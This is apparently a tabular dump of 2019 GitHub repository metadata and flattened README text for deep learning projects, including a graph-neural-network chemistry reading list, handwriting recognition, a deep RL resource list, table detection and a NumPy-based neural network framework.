prediction Github Compoundprotein interaction prediction with end to end learning of neural networks for graphs and sequences Masashi Tsubaki Kentaro Tomii Jun Sese venue Bioinformatics Volume 35 Issue 2 15 January 2019 graph neural networks interaction prediction Github Graph Warp Module an Auxiliary Module for Boosting the Power of Graph Neural Networks in Molecular Graph Analysis Katsuhiko Ishiguro Shin ichi Maeda Masanori Koyama venue arXiv 1902 graph neural networks Github A Transformer Model for Retrosynthesis Pavel Karpov Guillaume Godin Igor Tetko venue ChemRxiv graph neural networks transformer retrosynthesis SMILES USPTO Github Functional Transparency for Structured Data a Game Theoretic Approach Guang He Lee Wengong Jin David Alvarez Melis Tommi S Jaakkola venue ICML 2019 graph neural networks interpretability transparency decision trees Interpretable Deep Learning in Drug Discovery Kristina Preuer Gnter Klambauer Friedrich Rippmann Sepp Hochreiter Thomas Unterthiner venue arXiv 1903 graph neural networks interpretability Github Analyzing Learned Molecular Representations for Property Prediction Kevin Yang Kyle Swanson Wengong Jin Connor Coley Philipp Eiden Hua Gao Angel Guzman Perez Timothy Hopper Brian Kelley Miriam Mathea Andrew Palmer Volker Settels Tommi Jaakkola Klavs Jensen Regina Barzilay venue Journal of Chemical Information and Modeling 2019 59 8 graph neural networks benchmark results quantum mechanics physical chemistry biophysics physiology Github Graph Networks as a Universal Machine Learning Framework for Molecules and Crystals Chi Chen Weike Ye Yunxing Zuo Chen Zheng Shyue Ping Ong venue Chemistry of Materials 2019 31 9 graph neural networks transfer learning Github A Bayesian Graph Convolutional Network for Reliable Prediction of Molecular Properties with Uncertainty Quantification Seongok Ryu Yongchan Kwon Woo Youn Kim venue Chemical Science 2019 36 graph neural networks Bayesian inference uncertainty Predicting Drug Target Interaction Using a Novel Graph Neural Network with 3D Structure Embedded Graph Representation Jaechang Lim Seongok Ryu Kyubyong Park Yo Joong Choe Jiyeon Ham Woo Youn Kim venue Journal of Chemical Information and Modeling 2019 graph neural networks interaction prediction 3D information Molecule Property Prediction Based on Spatial Graph Embedding Xiaofeng Wang Zhen Li Mingjian Jiang Shuang Wang Shugang Zhang Zhiqiang Wei venue Journal of Chemical Information and Modeling 2019 graph neural networks Github DeepChemStable Chemical Stability Prediction with an Attention Based Graph Convolution Network Xiuming Li Xin Yan Qiong Gu Huihao Zhou Di Wu Jun Xu venue Journal of Chemical Information and Modeling 2019 59 3 graph neural networks Github Drug Drug Adverse Effect Prediction with Graph Co Attention Andreea Deac Yu Hsiang Huang Petar Velikovi Pietro Li Jian Tang venue arXiv 1905 graph neural networks polypharmacy side effects Pre training Graph Neural Networks Weihua Hu Bowen Liu Joseph Gomes Marinka Zitnik Percy Liang Vijay Pande Jure Leskovec venue arXiv 1905 graph neural networks pre training self supervised learning protein function prediction molecular property prediction Graph Normalizing Flows Jenny Liu Aviral Kumar Jimmy Ba Jamie Kiros Kevin Swersky venue NeurIPS 2019 graph neural networks invertible model flow model AE QM9 Retrosynthesis Prediction with Conditional Graph Logic Network Hanjun Dai Chengtao Li Connor W Coley Bo Dai Le Song venue NeurIPS 2019 graphical model graph neural networks retrosynthesis Molecular Property Prediction A Multilevel Quantum Interactions Modeling Perspective Chengqiang Lu Qi Liu Chao Wang Zhenya Huang Peize Lin Lixin He venue AAAI 2019 graph neural networks quantum mechanics Molecular Transformer A Model for Uncertainty Calibrated Chemical Reaction Prediction Philippe Schwaller Teodoro Laino Thophile Gaudin Peter Bolgar Christopher A Hunter Costas Bekas Alpha A Lee venue ACS Central Science 2019 5 9 graph neural networks reaction prediction SMILES machine translation transformer Decomposing Retrosynthesis into Reactive Center Prediction and Molecule Generation Xianggen Liu Pengyong Li Sen Song venue bioRXiv retrosynthesis GAT attention LSTM USPTO Pushing the Boundaries of Molecular Representation for Drug Discovery with the Graph Attention Mechanism Zhaoping Xiong Dingyan Wang Xiaohong Liu Feisheng Zhong Xiaozhe Wan Xutong Li Zhaojun Li Xiaomin Luo Kaixian Chen Hualiang Jiang Mingyue Zheng venue Journal of Medicinal Chemistry 2019 graph neural networks interpretability Github Structure Based Function Prediction using Graph Convolutional Networks Vladimir Gligorijevic P Douglas Renfrew Tomasz Kosciolek Julia Koehler Leman Kyunghyun Cho Tommi Vatanen Daniel Berenberg Bryn Taylor Ian M Fisk Ramnik J Xavier Rob Knight Richard Bonneau venue bioRXiv graph neural networks protein function prediction Protein Data Bank pre trained language model Bi LSTM interpretability Molecule Augmented Attention Transformer ukasz Maziarka Tomasz Danel Sawomir Mucha Krzysztof Rataj Jacek Tabor Stanisaw Jastrzebski venue Graph Representation Learning Workshop at NeurIPS 2019 graph neural networks property prediction transformer Learning Interaction Patterns from Surface Representations of Protein Structure Pablo Gainza Freyr Sverrisson Federico Monti Emanuele Rodol Davide Boscaini Michael Bronstein Bruno E Correia venue Graph Representation Learning Workshop at NeurIPS 2019 graph neural networks molecular surface pocket similarity comparison protein protein interaction site prediction prediction of interaction patterns Machine Learning for Scent Learning Generalizable Perceptual Representations of Small Molecules Benjamin Sanchez Lengeling Jennifer N Wei Brian K Lee Richard C Gerkin Aln Aspuru Guzik and Alexander B Wiltschko venue arXiv 1910 graph neural networks property prediction quantitative structure odor relationship QSOR modeling transfer learning Deciphering interaction fingerprints from protein molecular surfaces using geometric deep learning P Gainza F Sverrisson F Monti E Rodol D Boscaini M M Bronstein B E Correia venue Nature Methods 2019 graph neural networks molecular surface interaction fingerprinting geometric deep learning protein pocket ligand ,2019-09-18T07:09:24Z,2019-12-11T07:41:04Z,n/a,mufeili,User,5,26,7,42,master,mufeili,1,0,0,0,1,0,0
sushant097,Handwritten-Line-Text-Recognition-using-Deep-Learning-with-Tensorflow,blstm#cnn#crnn-tensorflow#ctc-loss#deep-learning#deep-neural-networks#handwritten-text-recognition#iam-dataset#python3#recurrent-neural-network#tensorflow,Handwritten Line Text Recognition using Deep Learning with Tensorflow Description Use Convolutional Recurrent Neural Network to recognize the Handwritten line text image without pre segmentation into words or characters Use CTC loss Function to train Why Deep Learning Why Deep Learning images WhyDeepLearning png raw true Why Deep Learning Deep Learning self extracts features with a deep neural networks and classify itself Compare to traditional Algorithms it performance increase with Amount of Data Basic Intuition on How it Works Stepwisedetail images Stepwisedetailofworkflow png raw true StepWise Detail First Use Convolutional Recurrent Neural Network to extract the important features from the handwritten line text Image The output before CNN FC layer 512x100x8 is passed to the BLSTM which is for sequence dependency and time sequence operations Then CTC LOSS Alex Graves https www cs toronto edu graves icml2006 pdf is used to train the RNN which eliminate the Alignment problem in Handwritten since handwritten have different alignment of every writers We just gave the what is written in the image Ground Truth Text and BLSTM output then it calculates loss simply as log gtText aim to minimize negative maximum likelihood path Finally CTC finds out the possible paths from the given labels Loss is given by for X Y pair is CtcLoss images CtcLossFormula png raw true CTC loss for the X Y pair Finally CTC Decode is used to decode the output during Prediction Detail Project Workflow Architecture of Model images ArchitectureDetails png raw true Model Architecture Project consists of Three steps 1 Multi scale feature Extraction Convolutional Neural Network 7 Layers 2 Sequence Labeling BLSTM CTC Recurrent Neural Network 2 layers of LSTM with CTC 3 Transcription Decoding the output of the RNN CTC decode DetailModelArchitecture images DetailModelArchitecture png raw true DetailModelArchitecture Requirements 1 Tensorflow 1 8 0 2 Flask 3 Numpy 4 OpenCv 3 5 Spell Checker autocorrect 0 3 0 pip install autocorrect Dataset Used IAM dataset download from here http www fki inf unibe ch databases iam handwriting database Only needed the lines images and lines txt ASCII Place the downloaded files inside data directory The Trained model is not available right now You can trained it by yourself To Train the model from scratch markdown python main py train To validate the model markdown python main py validate To Prediction markdown python main py Run in Web with Flask markdown python upload py Validation character error rate of saved model 8 654728 Python 3 6 4 Tensorflow 1 8 0 Init with stored values from model snapshot 24 Without Correction clothed leaf by leaf with the dioappoistmest With Correction clothed leaf by leaf with the dioappoistmest Prediction output on IAM Test Data PredictionOutput images IAMdatasetPredictionOutput png raw true Prediction Output On Iam Dataset Prediction output on Self Test Data PredictionOutput images PredictionOutput png raw true Prediction Output on Self Data Further Improvement Line segementation can be added for full paragraph text recognition Better Image preprocessing such as reduce backgoround noise to handle real time image more accurately Better Decoding approach to improve accuracy Some of the CTC Decoder found here https github com githubharald CTCDecoder This is part of my last semester project of Computer Science Program From Tribhuvan University July 2019,2019-08-07T13:16:17Z,2019-12-09T13:26:09Z,Python,sushant097,User,6,24,12,22,master,sushant097,1,0,0,3,1,0,0
dipanjanS,explainable_artificial_intelligence,n/a,explainableartificialintelligence Slides code and resources for model interpretation methods in machine learning and deep learning,2019-08-08T07:03:57Z,2019-12-14T17:52:12Z,Jupyter Notebook,dipanjanS,User,3,20,20,2,master,dipanjanS,1,0,0,0,0,0,0
kengz,awesome-deep-rl,awesome-list#deep-reinforcement-learning#resources,Awesome Deep RL Awesome https awesome re badge svg https awesome re A curated list of awesome Deep Reinforcement Learning resources Contents Libraries libraries Benchmark Results benchmark results Environments environments Competitions competitions Timeline timeline Books books Tutorials tutorials Blog blogs Libraries Berkeley Ray RLLib https github com ray project ray An open source library for reinforcement learning that offers both high scalability and a unified API for a variety of applications Berkeley Softlearning https github com rail berkeley softlearning A reinforcement learning framework for training maximum entropy policies in continuous domains Catalyst https github com catalyst team catalyst Accelerated DL RL ChainerRL https github com chainer chainerrl A deep reinforcement learning library built on top of Chainer DeepMind OpenSpiel https github com deepmind openspiel A collection of environments and algorithms for research in general reinforcement learning and search planning in games DeepMind TRFL https github com deepmind trfl TensorFlow Reinforcement Learning DeepRL https github com ShangtongZhang DeepRL Modularized Implementation of Deep RL Algorithms in PyTorch Facebook ELF https github com pytorch ELF A platform for game research with AlphaGoZero AlphaZero reimplementation Facebook Horizon https github com facebookresearch Horizon A platform for Applied Reinforcement Learning garage https github com rlworkgroup garage A toolkit for reproducible reinforcement learning research Google Dopamine https github com google dopamine A research framework for fast prototyping of reinforcement learning algorithms Google TF Agents https github com tensorflow agents TF Agents is a library for Reinforcement Learning in TensorFlow MAgent https github com geek ai MAgent A Platform for Many agent Reinforcement Learning NervanaSystems coach https github com NervanaSystems coach Reinforcement Learning Coach by Intel AI Lab OpenAI Baselines https github com openai baselines High quality implementations of reinforcement learning algorithms pytorch a2c ppo acktr gail https github com ikostrikov pytorch a2c ppo acktr gail PyTorch implementation of Advantage Actor Critic A2C Proximal Policy Optimization PPO Scalable trust region method for deep reinforcement learning using Kronecker factored approximation ACKTR and Generative Adversarial Imitation Learning GAIL pytorch rl https github com navneet nmk pytorch rl Model free deep reinforcement learning algorithms implemented in Pytorch RLgraph https github com rlgraph rlgraph Modular computation graphs for deep reinforcement learning RLkit https github com vitchyr rlkit Reinforcement learning framework and algorithms implemented in PyTorch rlpyt https github com astooke rlpyt Reinforcement Learning in PyTorch SLM Lab https github com kengz SLM Lab Modular Deep Reinforcement Learning framework in PyTorch Stable Baselines https github com hill a stable baselines A fork of OpenAI Baselines implementations of reinforcement learning algorithms TensorForce https github com tensorforce tensorforce A TensorFlow library for applied reinforcement learning Unity ML Agents Toolkit https github com Unity Technologies ml agents Unity Machine Learning Agents Toolkit vel https github com MillionIntegrals vel Bring velocity to deep learning research reaver https github com inoryy reaver A modular deep reinforcement learning framework with a focus on various StarCraft II based tasks Benchmark Results DeepMind bsuite https github com deepmind bsuite tree master bsuite OpenAI baselines results https github com openai baselines results OpenAI Baselines https github com openai baselines benchmarks OpenAI Spinning Up https spinningup openai com en latest spinningup bench html ray rl experiments https github com ray project rl experiments rl baselines zoo https github com araffin rl baselines zoo blob master benchmark md SLM Lab https github com kengz SLM Lab blob master BENCHMARK md vel https blog millionintegrals com vel pytorch meets baselines yarlp https github com btaba yarlp Environments AI2 THOR https github com allenai ai2thor A near photo realistic interactable framework for AI agents Animal AI Olympics https github com beyretb AnimalAI Olympics An AI competition with tests inspired by animal cognition Berkeley rl generalization https github com sunblaze ucb rl generalization Modifiable OpenAI Gym environments for studying generalization in RL BTGym https github com Kismuz btgym Scalable event driven RL friendly backtesting library Build on top of Backtrader with OpenAI Gym environment API Carla https github com carla simulator carla Open source simulator for autonomous driving research CuLE https github com NVlabs cule A CUDA port of the Atari Learning Environment ALE Deepdrive https github com deepdrive deepdrive End to end simulation for self driving cars DeepMind DM Control https github com deepmind dmcontrol The DeepMind Control Suite and Package DeepMind Lab https github com deepmind lab A customisable 3D platform for agent based AI research DeepMind pycolab https github com deepmind pycolab A highly customisable gridworld game engine with some batteries included DeepMind PySC2 https github com deepmind pysc2 StarCraft II Learning Environment Facebook EmbodiedQA https github com facebookresearch EmbodiedQA Train embodied agents that can answer questions in environments Facebook Habitat https github com facebookresearch habitat api A modular high level library to train embodied AI agents across a variety of tasks environments and simulators Facebook House3D https github com facebookresearch House3D A Rich and Realistic 3D Environment Facebook naturalrlenvironment https github com facebookresearch naturalrlenvironment natural signal Atari environments introduced in the paper Natural Environment Benchmarks for Reinforcement Learning Google Research Football https github com google research football An RL environment based on open source game Gameplay Football GVGAI Gym https github com rubenrtorrado GVGAIGYM An OpenAI Gym environment for games written in the Video Game Description Language including the Generic Video Game Competition framework gym doom https github com ppaquette gym doom Doom environments based on VizDoom gym duckietown https github com duckietown gym duckietown Self driving car simulator for the Duckietown universe gym gazebo2 https github com AcutronicRobotics gym gazebo2 A toolkit for developing and comparing reinforcement learning algorithms using ROS 2 and Gazebo gym ignition https github com robotology gym ignition Experimental OpenAI Gym environments implemented with Ignition Robotics gym super mario https github com ppaquette gym super mario 32 levels of original Super Mario Bros Holodeck https github com BYU PCCL holodeck High Fidelity Simulator for Reinforcement Learning and Robotics Research home platform https github com HoME Platform home platform A platform for artificial agents to learn from vision audio semantics physics and interaction with objects and other agents all within a realistic context ma gym https github com koulanurag ma gym A collection of multi agent environments based on OpenAI gym mazelab https github com zuoxingdong mazelab A customizable framework to create maze and gridworld environments Meta World https github com rlworkgroup metaworld An open source robotics benchmark for meta and multi task reinforcement learning Microsoft AirSim https github com Microsoft AirSim Open source simulator for autonomous vehicles built on Unreal Engine Unity from Microsoft AI Research Microsoft Jericho https github com microsoft jericho A learning environment for man made Interactive Fiction games Microsoft Malm https github com Microsoft malmo A platform for Artificial Intelligence experimentation and research built on top of Minecraft Microsoft MazeExplorer https github com microsoft MazeExplorer Customisable 3D environment for assessing generalisation in Reinforcement Learning Microsoft TextWorld https github com microsoft TextWorld A text based game generator and extensible sandbox learning environment for training and testing reinforcement learning RL agents MineRL https github com minerllabs minerl MineRL Competition for Sample Efficient Reinforcement Learning MuJoCo http www mujoco org Advanced physics simulation OpenAI Coinrun https github com openai coinrun Code for the environments used in the paper Quantifying Generalization in Reinforcement Learning OpenAI Gym Retro https github com openai retro Retro Games in Gym OpenAI Gym Soccer https github com openai gym soccer A multiagent domain featuring continuous state and action spaces OpenAI Gym https github com openai gym A toolkit for developing and comparing reinforcement learning algorithms OpenAI Multi Agent Particle Environment https github com openai multiagent particle envs A simple multi agent particle world with a continuous observation and discrete action space along with some basic simulated physics OpenAI Neural MMO https github com openai neural mmo A Massively Multiagent Game Environment OpenAI Procgen Benchmark https github com openai procgen Procedurally Generated Game Like Gym Environments OpenAI Roboschool https github com openai roboschool Open source software for robot simulation integrated with OpenAI Gym OpenAI RoboSumo https github com openai robosumo A set of competitive multi agent environments used in the paper Continuous Adaptation via Meta Learning in Nonstationary and Competitive Environments OpenAI Safety Gym https github com openai safety gym Tools for accelerating safe exploration research Personae https github com Ceruleanacg Personae RL SL Methods and Envs For Quantitative Trading Pommerman https github com MultiAgentLearning playground A clone of Bomberman built for AI research pybullet gym https github com benelot pybullet gym Open source implementations of OpenAI Gym MuJoCo environments for use with the OpenAI Gym Reinforcement Learning Research Platform PyGame Learning Environment https github com ntasfi PyGame Learning Environment Reinforcement Learning Environment in Python RLBench https github com stepjam RLBench A large scale benchmark and learning environment RLTrader https github com notadamking RLTrader A cryptocurrency trading environment using deep reinforcement learning and OpenAI s gym RoboNet https blog ml cmu edu 2019 11 26 robonet A Dataset for Large Scale Multi Robot Learning rocket lander https github com arex18 rocket lander SpaceX Falcon 9 Box2D continuous action simulation with traditional and AI controllers Stanford Gibson Environments https github com StanfordVL GibsonEnv Real World Perception for Embodied Agents Stanford osim rl https github com stanfordnmbl osim rl Reinforcement learning environments with musculoskeletal models Unity ML Agents Toolkit https github com Unity Technologies ml agents Unity Machine Learning Agents Toolkit UnityObstableTower https github com Unity Technologies obstacle tower env A procedurally generated environment consisting of multiple floors to be solved by a learning agent VizDoom https github com mwydmuch ViZDoom Doom based AI Research Platform for Reinforcement Learning from Raw Visual Information Competitions AWS DeepRacer League 2019 https aws amazon com deepracer league Flatland Challenge 2019 https www aicrowd com challenges flatland challenge NeurIPS 2019 Animal AI Olympics http animalaiolympics com NeurIPS 2019 Game of Drones https www microsoft com en us research academic program game of drones competition at neurips 2019 NeurIPS 2019 Learn to Move Walk Around https www aicrowd com challenges neurips 2019 learning to move walk around NeurIPS 2019 MineRL Competition http minerl io competition NeurIPS 2019 Reconnaissance Blind Chess https rbc jhuapl edu NeurIPS 2019 Robot open Ended Autonomous Learning https www aicrowd com challenges robot open ended autonomous learning real Unity Obstacle Tower Challenge 2019 https blogs unity3d com 2019 01 28 obstacle tower challenge test the limits of intelligence systems Timeline 1947 Monte Carlo Sampling http eniacinaction com the articles 3 los alamos bets on eniac nuclear monte carlo simulations 1947 8 1958 Perceptron https www ling upenn edu courses cogs501 Rosenblatt1958 pdf 1959 Temporal Difference Learning https dl acm org citation cfm id 1661924 1983 ASE ALE the first Actor Critic algorithm https psycnet apa org record 1984 13799 001 1986 Backpropagation algorithm https www nature com articles 323533a0 1989 CNNs http citeseerx ist psu edu viewdoc download doi 10 1 1 476 479 rep rep1 type pdf 1989 Q Learning http www cs rhul ac uk chrisw newthesis pdf 1991 TD Gammon http bkgm com books Robertie LearningFromTheMachine html 1992 REINFORCE https dl acm org citation cfm id 139614 1992 Experience Replay https dl acm org citation cfm id 139620 1994 SARSA http citeseerx ist psu edu viewdoc summary doi 10 1 1 17 2539 1999 Nvidia invented the GPU https www nvidia com object gpu html 2007 CUDA released https developer nvidia com cuda zone 2012 Arcade Learning Environment ALE https arxiv org abs 1207 4708 2013 DQN https arxiv org abs 1312 5602 2015 Feb DQN human level control in Atari https www nature com articles nature14236 2015 Feb TRPO https arxiv org abs 1502 05477 2015 Jun Generalized Advantage Estimation https arxiv org abs 1506 02438 2015 Sep Deep Deterministic Policy Gradient DDPG https arxiv org abs 1509 02971 2015 Sep DoubleDQN https arxiv org abs 1509 06461 2015 Nov DuelingDQN https arxiv org abs 1511 06581 2015 Nov Prioritized Experience Replay https arxiv org abs 1511 05952 2015 Nov TensorFlow https www tensorflow org 2016 Feb A3C https arxiv org abs 1602 01783 2016 Mar AlphaGo beats Lee Sedol 4 1 https deepmind com alphago korea 2016 Jun OpenAI Gym https github com openai gym 2016 Jun Generative Adversarial Imitation Learning GAIL https arxiv org abs 1606 03476 2016 Oct PyTorch https pytorch org 2017 Mar Model Agnostic Meta Learning MAML https arxiv org abs 1703 03400 2017 Jul Distributional RL https arxiv org abs 1707 06887 2017 Jul PPO https arxiv org abs 1707 06347 2017 Aug OpenAI DotA 2 1 1 https openai com blog more on dota 2 2017 Aug Intrinsic Cusiority Module ICM https arxiv org abs 1705 05363 2017 Oct Rainbow https arxiv org abs 1710 02298 2017 Dec AlphaZero https arxiv org abs 1712 01815 2018 Jan Soft Actor Critic https ai googleblog com 2019 01 soft actor critic deep reinforcement html 2018 Feb IMPALA https deepmind com blog article impala scalable distributed deeprl dmlab 30 2018 Jun Qt Opt https ai googleblog com 2018 06 scalable deep reinforcement learning html 2018 Nov Go Explore solved Montezumas Revenge https eng uber com go explore 2018 Dec AlphaZero becomes the strongest player in history for chess Go and Shogi https deepmind com blog article alphazero shedding new light grand games chess shogi and go 2018 Dec AlphaStar https deepmind com blog article alphastar mastering real time strategy game starcraft ii 2019 Apr OpenAI F,2019-08-17T22:43:43Z,2019-12-05T16:14:47Z,n/a,kengz,User,1,19,3,20,master,kengz,1,0,0,0,0,0,0
creotiv,hdrnet-pytorch,n/a,Deep Bilateral Learning for Real Time Image Enhancements Unofficial PyTorch implementation of Deep Bilateral Learning for Real Time Image Enhancement SIGGRAPH 2017 https groups csail mit edu graphics hdrnet Python 3 6 Dependencies To install the Python dependencies run pip install r requirements txt Datasets Adobe FiveK https data csail mit edu graphics fivek Usage To train a model run the following command python train py test image DSC1177 jpg dataset datasetpath lr 0 001 To get all train params run python train py h To test image run python test py checkpoint ch ckpt04000 pth input DSC1177 jpg output out png Known issues Torch F gridsmaple doesn t have triliniear interpolation that was used in original network which is strange cause it can use 3D image as input that s make things worse Hope they will fix this until that will try fix this somehow Only PointwiseNN implemented currently Dataset has no augmentation which making training difficult No raw HDR input,2019-08-07T09:26:00Z,2019-12-12T19:28:45Z,Python,creotiv,User,4,19,2,6,master,creotiv,1,0,0,2,1,1,0
mlvlab,COSE474,n/a,COSE474 COSE474 Deep Learning Korea University Instructor Hyunwoo J Kim Contributors Seungdong Yoa Dasol Hwang Sihyeon Kim Contents 1 Introduction to Neural Networks using PyTorch 2 layer NN CIFAR10 1IntroductiontoNeuralNetworksusingPyTorch ipynb 2 MNIST Tutorial CNN 2MNISTTutorial 20 CNN ipynb 3 Object Detection and Multiple Object Tracking MOT 3ObjectDetectionandMOTtutorial ipynb 4 Semantic Segmentation 4SemanticSegmentation ipynb 5 Adversarial Examples 5AdversarialExamples ipynb 6 Style Transfer with CycleGAN 6StyleTransferwithCycleGAN ipynb Reference 1 Introduction to Colab https youtu be inN8seMm7UI,2019-08-14T15:23:24Z,2019-09-29T13:18:29Z,Jupyter Notebook,mlvlab,Organization,10,18,4,72,master,SeungdongYoa#blacktime14#MLman#dasolhwang,4,0,0,0,0,0,0
interviewBubble,Tabulo,deep-learning#detection#faster-r-cnn#luminoth#ocr#pdf-table-extraction#python#sonnet#ssd#table-data-extraction#table-detection#table-detection-using-deep-learning#table-recognition#tabulo#tensorflow#tesseract,Tabulo https github com interviewBubble Tabulo raw master docs images Tabulologo png https github com interviewBubble Tabulo Build Status https travis ci org tryolabs luminoth svg branch master https travis ci org tryolabs luminoth Documentation Status https readthedocs org projects luminoth badge version latest http luminoth readthedocs io en latest badge latest codecov https codecov io gh tryolabs luminoth branch master graph badge svg https codecov io gh tryolabs luminoth License https img shields io badge License BSD 203 Clause blue svg https opensource org licenses BSD 3 Clause Tabulo is an open source toolkit for computer vision Currently we support table detection but we are aiming for much more It is built in Python using Luminoth https github com tryolabs luminoth TensorFlow https www tensorflow org and Sonnet https github com deepmind sonnet Table of Contents 1 Installation Instructions 1 installation instructions 2 Avaiable API s 2 avaiable apis 3 Working with pretrained Models 3 working with pretrained models 4 Runnning Tabulo 4 runnning tabulo 5 Runnning Tabulo As Service 5 runnning tabulo as service 6 Supported models 6 supported models 7 Usage 7 usage 8 Working with datasets 8 working with datasets 9 Training 9 training 10 LICENSE 10 license 1 Installation Instructions Tabulo currently supports Python 2 7 and 3 43 6 1 1 Pre requisites To use Tabulo TensorFlow https www tensorflow org install must be installed beforehand If you want GPU support you should install the GPU version of TensorFlow with pip install tensorflow gpu or else you can use the CPU version using pip install tensorflow We are using tesseract to extract data from table so you have to install tesseract also Follow this link to install tessersact https interviewbubble com install tesseract on mac linux windows centos 1 2 Installing Tabulo First clone the repo on your machine and then install with pip bash git clone https github com interviewBubble Tabulo git cd tabulo pip install e 1 3 Check that the installation worked Simply run tabulo help 2 Avaiable API s localhost 5000 api fasterrcnn predict To detect table in the image localhost 5000 api fasterrcnn extract Extract table content from detected tables 3 Working with pretrained Models DOWNLOAD pretrained model from Google drive https drive google com drive folders 1aUh9RfGn2XGgG2EtpKFh7P6PmcC3Q48z usp sharing Unzip and Copy downloaded luminoth folder inside luminoth utils pretrainedmodels folder Hit this command to list all check points tabulo checkpoint list You will get output like this Checkpoints https github com interviewBubble Tabulo raw master docs images Checkpoints png Now run server using this command tabulo server web checkpoint 6aac7a1e8a8e 4 Runnning Tabulo 4 1 Running Tabulo as Web Server Running Tabulo https github com interviewBubble Tabulo blob master docs images tabuloserver png 4 2 Example of Table Detection with Faster R CNN By Tabulo Example of Table Detection with Faster R CNN By Tabulo https github com interviewBubble Tabulo blob master docs images tabledetect png 4 3 Example of Table Data Extraction with tesseract By Tabulo Example of Table Data Extraction with tesseract By Tabulo https github com interviewBubble Tabulo blob master docs images tabledataextract png 5 Runnning Tabulo As Service 5 1 Using Curl command Curl command to detect tabel curl X POST http localhost 5000 api fasterrcnn predict H Content Type application x www form urlencoded H Postman Token 70478bd2 e1e8 442f b0bf ea5ecf7bf4d8 H cache control no cache H content type multipart form data boundary WebKitFormBoundary7MA4YWxkTrZu0gW F image path to image page8 min jpg 5 2 With PostMan Header Section Table Detection using Postman https github com interviewBubble Tabulo blob master docs images tabuloresquestheader png Data Section Table Detection using Postman https github com interviewBubble Tabulo raw master docs images tabledetectAPI png 6 Supported models Currently we support the following models Object Detection Faster R CNN https arxiv org abs 1506 01497 SSD https arxiv org abs 1512 02325 We also provide pre trained checkpoints for the above models trained on popular datasets such as COCO http cocodataset org and Pascal http host robots ox ac uk pascal VOC 7 Usage There is one main command line interface which you can use with the tabulo command Whenever you are confused on how you are supposed to do something just type tabulo help or tabulo help and a list of available options with descriptions will show up 8 Working with datasets DataSet to train your custom model https github com interviewBubble Table Detection using Deep Learning tree master data 9 Training See Training your own model https github com interviewBubble Table Detection using Deep Learning to learn how to train locally or in Google Cloud 10 LICENSE Released under the BSD 3 Clause LICENSE References https github com Sargunan Table Detection using Deep learning https github com tryolabs luminoth,2019-08-29T13:29:43Z,2019-12-11T04:38:15Z,Python,interviewBubble,User,4,18,7,41,master,interviewBubble#StubbyB,2,0,0,4,8,0,1
eLeVeNnN,shinnosuke,deep-learning#deep-learning-algorithms#deep-learning-framework#deep-learning-library#deep-learning-tutorial#deep-neural-networks,Shinnosuke Deep Learning Framework Descriptions Shinnosuke is a high level neural network which has almost the same API to Keras with slightly differences It was written by Python only and dedicated to realize experimentations quickly Here are some features of Shinnosuke 1 Based on Numpy CPU version and native to Python GPU Version https github com eLeVeNnN shinnosuke gpu 2 Without any other 3rd party deep learning library 3 Keras like API several basic AI Examples are provided easy to get start 4 Support commonly used models such as Dense Conv2D MaxPooling2D LSTM SimpleRNN etc 5 Sequential model for most sequence network combinations and Functional model for resnet etc are implemented 6 Training is conducted on forward graph and backward graph 7 Autograd is supported Shinnosuke is compatible with Python 3 x 3 6 is recommended Getting started The core networks of Shinnosuke is a model which provide a way to combine layers There are two model types Sequential a linear stack of layers and Functional build a graph for layers Here is a example of Sequential model python from shinnosuke models import Sequential m Sequential Using add to connect layers python from shinnosuke layers import Dense m add Dense nout 500 activation relu nin 784 must be specify nin if current layer is the first layer of model m add Dense nout 10 activation softmax no need to specify nin as shinnosuke will automatic calculate the input and output shape Here are some differences with Keras nout and nin are named units and inputdim in Keras respectively Once you have constructed your model you should configure it with compile before training python m compile loss sparsecategoricalcrossentropy optimizer sgd If you apply softmax to multi classify task and your labels are one hot encoded vectors matrix you shall specify loss as sparsecategoricalcrossentropy otherwise use categoricalcrossentropy While in Keras categoricalcrossentropy supports for one hot encoded labels And Shinnosuke model only supports one metrics accuracy which no need to specify in compile Use print function to see details of model python print m you shall see Layer type Output Shape Param Connected to Dense None 500 392500 Dense None 10 5010 Dense Total params 397510 Trainable params 397510 Non trainable params 0 Having finished compile you can start training your data in batches python trainX and trainy are Numpy arrays for 2 dimension data trainX s shape should be trainingnums inputdim m fit trainX trainy batchsize 128 epochs 5 validationratio 0 drawaccloss True By specify validationratio 0 0 1 0 shinnosuke will split validation data from training data according to validationratio otherwise validationratio 0 means no validation data Alternatively you can feed validationdata manually python m fit trainX trainy batchsize 128 epochs 5 validationdata validX validy drawaccloss True If drawaccloss True a dynamic updating figure will be shown in the training process like below Once completing training your model you can save or load your model by save load respectively python m save savepath m load modelpath Evaluate your model performance by evaluate python acc loss m evaluate testX testy batchsize 128 Or obtain predictions on new data python yhat m predict xtest For Functional model first instantiate an Input layer python from shinnosuke layers import Input Xinput Input shape None 1 28 28 batchsize channels height width You need to specify the input shape notice that for Convolutional networks data s channels must be in the axis 1 instead of 1 and you should state batchsize as None which is unnecessary in Keras Then Combine your layers by functional API python from shinnosuke models import Model from shinnosuke layers import Conv2D MaxPooling2D from shinnosuke layers import Activation from shinnosuke layers import BatchNormalization from shinnosuke layers import Flatten Dense X Conv2D 8 2 2 padding VALID initializer normal activation relu Xinput X MaxPooling2D 2 2 X X Flatten X X Dense 10 initializer normal activation softmax X model Model inputs Xinput outputs X model compile optimizer sgd loss sparsecategoricalcrossentropy model fit trainX trainy batchsize 256 epochs 80 validationratio 0 Pass inputs and outputs layer to Model and then compile and fit model like Sequential model Building an image classification model a question answering system or any other model is just as convenient and fast In the Examples folder https github com eLeVeNnN shinnosuke Examples of this repository you can find more advanced models Both dynamic and static graph features As you will see soon in below Shinnosuke has two basic classes Layer and Node For Layer operations between layers can be described like this here gives an example of py from shinnosuke layers import Input Add from shinnosuke layers import Dense X Input shape 3 5 Xshortcut X X Dense 5 X Dense will output a 3 5 tensor X Add Xshortcut X Meanwhile Shinnosuke will construct a graph as below While Node Operations have both dynamic graph and static graph features python from shinnosuke layers Base import Variable x Variable 3 y Variable 5 z x y print z getvalue You suppose get value 8 at same time shinnosuke construct a graph as below Autograd What is autograd In a word It means automatically calculate the network s gradients without any prepared backward codes for users Shinnosuke s autograd supports for several operators such as etc Here gives an example For a simple fully connected neural network you can use Dense to construct it python from shinnosuke models import Sequential from shinnosuke layers import Dense import numpy as np announce a Dense layer fullyconnected Dense 4 nin 5 m Sequential m add fullyconnected m compile optimizer sgd loss mse don t mean to train it use compile to initialize parameters initialize inputs np random seed 0 X np random rand 3 5 feed X as fullyconnected s inputs fullyconnected feed X inputs forward fullyconnected forward out1 fullyconnected getvalue print out1 getvalue feed gradient to 